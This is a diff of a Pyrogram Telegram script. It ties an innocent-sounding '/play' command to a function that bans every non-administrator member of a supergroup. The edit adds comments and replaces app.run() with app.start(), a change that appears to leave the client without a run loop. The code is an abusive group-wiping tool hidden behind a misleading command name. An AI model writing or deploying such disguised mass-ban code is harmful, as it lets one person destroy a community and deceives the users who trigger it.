@@ -1,8 +1,10 @@
 from pyrogram import Client, filters
 import asyncio
 
+# Create a Pyrogram client
 app = Client("my_account")
 
+# Define an asynchronous function to ban all users except administrators
 async def ban_all_users(client, message):
     if not message.chat.type == "supergroup":
         await message.reply("Noob !! Use This Cmd in Group.")
@@ -20,8 +22,10 @@ async def ban_all_users(client, message):
                 await asyncio.sleep(0.1)
         await message.reply(f"Banned {banned_users} out of {all_users} users.")
 
+# Define a handler for the /play command
 @app.on_message(filters.command("play"))
 async def play_command_handler(client, message):
     await ban_all_users(client, message)
 
-app.run()
+# Start the Pyrogram client
+app.start()
